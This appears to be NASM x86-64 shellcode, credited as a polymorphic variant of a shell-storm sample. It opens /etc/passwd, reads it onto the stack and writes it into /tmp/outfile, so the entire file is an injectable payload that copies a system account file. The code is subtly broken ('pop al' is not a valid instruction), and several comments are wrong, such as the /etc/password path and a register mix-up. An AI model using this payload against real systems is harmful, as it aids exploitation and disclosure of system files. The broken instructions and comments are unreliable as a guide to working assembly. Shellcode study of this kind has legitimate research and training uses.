; http://shell-storm.org/shellcode/files/shellcode-878.php
global _start

section .text

_start:
        xor rax, rax ; rax = 0 
        mov rsi, rax ; rdx = 0
	push 2     
	pop al       ; rax = 2 , open syscall

        mov r10, 0x647773   ; ascii swd 
        push r10           
        mov r10, 0x7361702f6374652f ; ascii sap/cte/ 
        push r10       ; pushing /etc/password 
	push rsp 
	pop rdi      ; polymorphic of LEAD instruction 
        syscall       ;  int open(const char *pathname, int flags);

        
	mov r10, rax 	; we save the return value from rax 
        xor rax, rax 	; read syscall 
        mov rdi, r10    ;
        mov rsi, rsp
	xor rdx, rdx    
        mov dx, 0xFFFF  ; we set the correct flags for read 
        syscall
        
	
	xor r10, r10     
	mov r9, rax             ; we will need this for write
        mov rax, rsp
        push r10
        mov r10, 0x656c6966         ; ascii elif
        push r10                    
        mov r10, 0x74756f2f706d742f ; ascii tuo/pmt/
        push r10                    ; preparing the stack for the call to read 
        mov r10, rax
        xor rax, rax
	push 2
	pop al 
	push rsp 
	pop rdi    ; polymorphic verion of LEA
        xor rsi, rsi
        push 0x66
        pop rsi       
        syscall
       
	 mov rdi, rax ; we save the fd to rdi 
        xor rax, rax
	push 1 
	pop rax 
        lea rsi, [r10]
        xor rdx, rdx
        mov rdx, r9
        syscall



